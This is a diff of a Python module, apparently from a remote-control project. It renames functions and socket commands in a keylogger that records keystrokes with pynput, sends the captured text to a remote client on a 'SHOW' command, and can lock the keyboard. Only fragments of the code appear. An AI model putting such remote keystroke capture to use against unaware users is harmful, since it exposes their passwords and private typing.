@@ -1,7 +1,7 @@
 import threading
 
 import keyboard
-from RD_Constant import BUFFERSIZE, FORMAT
+from RD_Constant import BUFFERSIZE
 from pynput.keyboard import Listener
 
 
@@ -21,10 +21,10 @@ def keylogger(key):
     return
 
 
-def _print(client):
+def show(client):
     global cont
     client.sendall(bytes(cont, "utf8"))
-    cont = " "
+    cont = ""
     return
 
 
@@ -47,25 +47,25 @@ def lock():
     return
 
 
-def key_log(client):
-    global cont, flag, islock, ishook
+def keylog(client):
+    global cont, flag, islock, isbind
     islock = 0
-    ishook = 0
+    isbind = 0
     threading.Thread(target=listen).start()
     flag = 0
-    cont = " "
+    cont = ""
     message = ""
     while True:
-        message = client.recv(BUFFERSIZE).decode(FORMAT)
-        if "HOOK" in message:
-            if ishook == 0:
+        message = client.recv(BUFFERSIZE).decode("utf8")
+        if "BIND" in message:
+            if isbind == 0:
                 flag = 1
-                ishook = 1
+                isbind = 1
             else:
                 flag = 2
-                ishook = 0
-        elif "PRINT" in message:
-            _print(client)
+                isbind = 0
+        elif "SHOW" in message:
+            show(client)
         elif "LOCK" in message:
             lock()
         elif "QUIT" in message:
